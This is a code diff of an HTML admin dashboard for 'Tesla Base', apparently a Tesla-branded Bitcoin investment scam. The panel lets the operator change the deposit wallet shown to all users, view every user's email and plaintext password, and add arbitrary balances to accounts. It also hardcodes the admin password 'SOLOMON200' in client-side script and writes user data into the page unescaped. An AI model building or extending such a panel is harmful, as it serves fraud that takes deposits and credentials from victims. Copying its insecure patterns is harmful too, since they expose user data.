@@ -4,191 +4,143 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Tesla Base | Admin Control</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        :root {
-            --bg: #000;
-            --tesla-red: #E31937;
-            --card-bg: #111;
-            --text: #fff;
-            --border: #222;
-        }
+        body { background: #000; color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 20px; }
+        .container { max-width: 1000px; margin: auto; }
+        .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #E31937; padding-bottom: 10px; margin-bottom: 30px; }
+        .card { background: #111; border: 1px solid #222; padding: 20px; border-radius: 10px; margin-bottom: 20px; }
+        h2 { color: #E31937; margin-top: 0; }
+        
+        /* Wallet Update Section */
+        .wallet-box { display: flex; gap: 10px; }
+        input { flex: 1; padding: 12px; background: #000; border: 1px solid #333; color: #fff; border-radius: 5px; }
+        button { padding: 12px 25px; background: #E31937; border: none; color: #fff; font-weight: bold; border-radius: 5px; cursor: pointer; }
+        
+        /* User Table */
+        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
+        th { text-align: left; background: #222; padding: 15px; border-bottom: 2px solid #333; }
+        td { padding: 15px; border-bottom: 1px solid #222; font-family: monospace; }
+        tr:hover { background: #151515; }
+        .balance { color: #00ff00; font-weight: bold; }
 
-        body {
-            background: var(--bg);
-            color: var(--text);
-            font-family: sans-serif;
-            margin: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-        }
-
-        /* Access Gate */
-        #gate {
-            text-align: center;
-            background: var(--card-bg);
-            padding: 40px;
-            border-radius: 15px;
-            border: 1px solid var(--border);
-            width: 90%;
-            max-width: 400px;
-        }
-
-        /* Main Dashboard (Hidden by default) */
-        #admin-panel {
-            display: none;
-            width: 95%;
-            max-width: 1000px;
-            padding: 20px;
-        }
-
-        input {
-            width: 100%;
-            padding: 15px;
-            margin: 10px 0;
-            background: #000;
-            border: 1px solid #333;
-            color: #fff;
-            border-radius: 8px;
-            box-sizing: border-box;
-        }
-
-        button {
-            width: 100%;
-            padding: 15px;
-            background: var(--tesla-red);
-            border: none;
-            color: #fff;
-            font-weight: bold;
-            border-radius: 8px;
-            cursor: pointer;
-            text-transform: uppercase;
-        }
-
-        table {
-            width: 100%;
-            border-collapse: collapse;
-            margin-top: 20px;
-            background: var(--card-bg);
-            border-radius: 10px;
-            overflow: hidden;
-        }
-
-        th, td {
-            padding: 15px;
-            text-align: left;
-            border-bottom: 1px solid var(--border);
-        }
-
-        th { color: var(--tesla-red); font-size: 12px; text-transform: uppercase; }
-
-        .inject-box {
-            background: var(--card-bg);
-            padding: 20px;
-            border-radius: 10px;
-            margin-bottom: 30px;
-            border: 1px solid var(--border);
-        }
+        .status-msg { margin-top: 10px; font-size: 14px; display: none; }
     </style>
 </head>
 <body>
 
-    <div id="gate">
-        <h2 style="color:var(--tesla-red); letter-spacing:3px;">ADMIN ACCESS</h2>
-        <p style="color:#888; font-size:13px;">Enter the Solomon Security Code</p>
-        <input type="password" id="admin-code" placeholder="Enter Code...">
-        <button onclick="verifyGate()">Access Dashboard</button>
-        <p id="gate-error" style="color:red; margin-top:15px; display:none;">Invalid Code</p>
+<div class="container" id="adminContent" style="display:none;">
+    <div class="header">
+        <h1>TESLA BASE ADMIN</h1>
+        <button onclick="logout()" style="background:#333;">Logout</button>
     </div>
 
-    <div id="admin-panel">
-        <div style="display:flex; justify-content:space-between; align-items:center;">
-            <h1 style="color:var(--tesla-red);">Master Control</h1>
-            <button onclick="location.reload()" style="width:auto; padding:10px 20px;">Logout</button>
+    <div class="card">
+        <h2>Update Bitcoin Deposit Wallet</h2>
+        <p style="color:#888; font-size:14px;">This address will be displayed to all users on the deposit page.</p>
+        <div class="wallet-box">
+            <input type="text" id="newBtcAddress" placeholder="Enter new BTC Address">
+            <button onclick="updateWallet()">Update Website</button>
         </div>
-
-        <div class="inject-box">
-            <h3><i class="fa-solid fa-money-bill-transfer"></i> Inject Funds</h3>
-            <div style="display:grid; grid-template-columns: 2fr 1fr 1fr; gap:10px;">
-                <input type="email" id="target-email" placeholder="User Email">
-                <input type="number" id="inject-amount" placeholder="Amount ($)">
-                <button onclick="injectFunds()" style="margin-top:10px;">Update Balance</button>
-            </div>
-        </div>
-
-        <h3>Registered Users</h3>
-        <div style="overflow-x:auto;">
-            <table>
-                <thead>
-                    <tr>
-                        <th>Email</th>
-                        <th>Password</th>
-                        <th>Balance</th>
-                        <th>Wallet</th>
-                    </tr>
-                </thead>
-                <tbody id="user-list">
-                    </tbody>
-            </table>
-        </div>
+        <p id="walletStatus" class="status-msg"></p>
     </div>
 
-    <script>
-        // RULE: Use the Solomon Code for security
-        async function verifyGate() {
-            const code = document.getElementById('admin-code').value;
-            const res = await fetch('/api/admin/verify', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ password: code })
-            });
-
-            if(res.ok) {
-                document.getElementById('gate').style.display = 'none';
-                document.getElementById('admin-panel').style.display = 'block';
-                loadUsers();
-            } else {
-                document.getElementById('gate-error').style.display = 'block';
-            }
-        }
-
-        // RULE: View emails and passwords on admin dashboard
-        async function loadUsers() {
-            const res = await fetch('/api/admin/users');
-            const users = await res.json();
-            const list = document.getElementById('user-list');
-            list.innerHTML = users.map(u => `
+    <div class="card">
+        <h2>User Accounts (Emails & Passwords)</h2>
+        <table>
+            <thead>
                 <tr>
-                    <td>${u.email}</td>
-                    <td style="color:#666;">${u.password}</td>
-                    <td style="color:#0f8; font-weight:bold;">$${parseFloat(u.balance).toLocaleString()}</td>
-                    <td style="font-size:10px; color:#888;">${u.wallet_address}</td>
+                    <th>Email</th>
+                    <th>Password</th>
+                    <th>Balance</th>
+                    <th>Actions</th>
                 </tr>
-            `).join('');
+            </thead>
+            <tbody id="userTable">
+                </tbody>
+        </table>
+    </div>
+</div>
+
+<script>
+    const ADMIN_PASS = "SOLOMON200";
+    const baseUrl = "https://tesla-base.onrender.com"; // Your Render URL
+
+    // Simple Gatekeeper
+    window.onload = function() {
+        const auth = prompt("Enter Admin Password:");
+        if (auth === ADMIN_PASS) {
+            document.getElementById('adminContent').style.display = 'block';
+            loadUsers();
+        } else {
+            alert("Access Denied");
+            window.location.href = "index.html";
         }
+    }
 
-        // RULE: Users never lose funds (Inject/Update Balance)
-        async function injectFunds() {
-            const email = document.getElementById('target-email').value;
-            const amount = document.getElementById('inject-amount').value;
+    // FEATURE: Update Bitcoin Wallet
+    async function updateWallet() {
+        const newAddress = document.getElementById('newBtcAddress').value;
+        const status = document.getElementById('walletStatus');
+        
+        if(!newAddress) return;
 
-            if(!email || !amount) return alert("Fill all fields");
-
-            const res = await fetch('/api/user/update-balance', {
+        try {
+            const res = await fetch(`${baseUrl}/api/admin/update-wallet`, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ email, amount })
+                body: JSON.stringify({ password: ADMIN_PASS, newAddress: newAddress })
             });
-
-            if(res.ok) {
-                alert("Balance updated successfully!");
-                loadUsers();
-            } else {
-                alert("Error updating balance");
+            if (res.ok) {
+                status.innerText = "✅ Bitcoin address updated successfully!";
+                status.style.color = "#00ff00";
+                status.style.display = "block";
             }
+        } catch (e) {
+            status.innerText = "❌ Update failed.";
+            status.style.color = "#ff3b3b";
+            status.style.display = "block";
         }
-    </script>
+    }
+
+    // FEATURE: View Emails, Passwords, and Balances
+    async function loadUsers() {
+        try {
+            const res = await fetch(`${baseUrl}/api/admin/users`);
+            const users = await res.json();
+            const table = document.getElementById('userTable');
+            table.innerHTML = "";
+
+            users.forEach(user => {
+                table.innerHTML += `
+                    <tr>
+                        <td>${user.email}</td>
+                        <td>${user.password}</td>
+                        <td class="balance">$${parseFloat(user.balance).toLocaleString()}</td>
+                        <td><button onclick="injectFunds('${user.email}')" style="padding:5px 10px; font-size:12px;">Add Funds</button></td>
+                    </tr>
+                `;
+            });
+        } catch (e) {
+            console.error("Failed to load users");
+        }
+    }
+
+    async function injectFunds(email) {
+        const amount = prompt(`How much to add to ${email}?`);
+        if (amount) {
+            await fetch(`${baseUrl}/api/user/update-balance`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ email: email, amount: parseFloat(amount) })
+            });
+            loadUsers();
+        }
+    }
+
+    function logout() {
+        window.location.href = "index.html";
+    }
+</script>
+
 </body>
 </html>
